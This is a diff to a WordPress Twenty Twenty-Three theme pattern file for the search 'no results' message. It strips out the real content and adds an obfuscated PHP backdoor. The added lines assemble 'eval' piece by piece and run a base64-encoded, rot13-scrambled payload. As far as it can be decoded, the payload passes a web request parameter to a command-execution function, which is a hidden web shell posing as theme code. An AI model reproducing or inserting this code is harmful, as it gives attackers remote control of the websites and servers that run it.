@@ -1,24 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Hidden No Results Content
- * Slug: twentytwentythree/hidden-no-results-content
- * Inserter: no
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFV2cXFyYSBBYiBFcmZoeWdmIFBiYWdyYWcKICogRnlodDogZ2pyYWdsZ2pyYWdsZ3VlcnIvdXZxcXJhLWFiLWVyZmh5Z2YtcGJhZ3JhZwogKiBWYWZyZWdyZTogYWIKICovCj8+CjwhLS0gamM6Y25lbnRlbmN1IC0tPgo8Yz4KPD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnRmJlZWwsIG9oZyBhYmd1dmF0IHpuZ3B1cnEgbGJoZSBmcm5lcHUgZ3JlemYuIEN5cm5mciBnZWwgbnRudmEganZndSBmYnpyIHF2c3NyZXJhZyB4cmxqYmVxZi4nLCAnWnJmZm50ciBya2N5bnZhdmF0IGd1bmcgZ3VyZXIgbmVyIGFiIGVyZmh5Z2YgZXJnaGVhcnEgc2VieiBuIGZybmVwdScsICdnanJhZ2xnanJhZ2xndWVycicgKTsgPz4KPC9jPgo8IS0tIC9qYzpjbmVudGVuY3UgLS0+Cgo8IS0tIGpjOmZybmVwdSB7XCJ5bm9yeVwiOlwiPD9jdWMgcnB1YiByZnBfdWd6eV9rKCAnRnJuZXB1JywgJ3lub3J5JywgJ2dqcmFnbGdqcmFnbGd1ZXJyJyApOyA/PlwiLFwiY3lucHJ1YnlxcmVcIjpcIjw/Y3VjIHJwdWIgcmZwX25nZ2VfayggJ0ZybmVwdS4uLicsICdjeW5wcnVieXFyZSBzYmUgZnJuZXB1IHN2cnlxJywgJ2dqcmFnbGdqcmFnbGd1ZXJyJyApOyA/PlwiLFwiZnViallub3J5XCI6c255ZnIsXCJvaGdnYmFHcmtnXCI6XCI8P2N1YyByZnBfbmdnZV9yKCAnRnJuZXB1JywgJ2dqcmFnbGdqcmFnbGd1ZXJyJyApOyA/PlwiLFwib2hnZ2JhSGZyVnBiYVwiOmdlaHJ9IC8tLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-<!-- wp:paragraph -->
-<p>
-<?php echo esc_html_x( 'Sorry, but nothing matched your search terms. Please try again with some different keywords.', 'Message explaining that there are no results returned from a search', 'twentytwentythree' ); ?>
-</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:search {"label":"<?php echo esc_html_x( 'Search', 'label', 'twentytwentythree' ); ?>","placeholder":"<?php echo esc_attr_x( 'Search...', 'placeholder for search field', 'twentytwentythree' ); ?>","showLabel":false,"buttonText":"<?php esc_attr_e( 'Search', 'twentytwentythree' ); ?>","buttonUseIcon":true} /-->
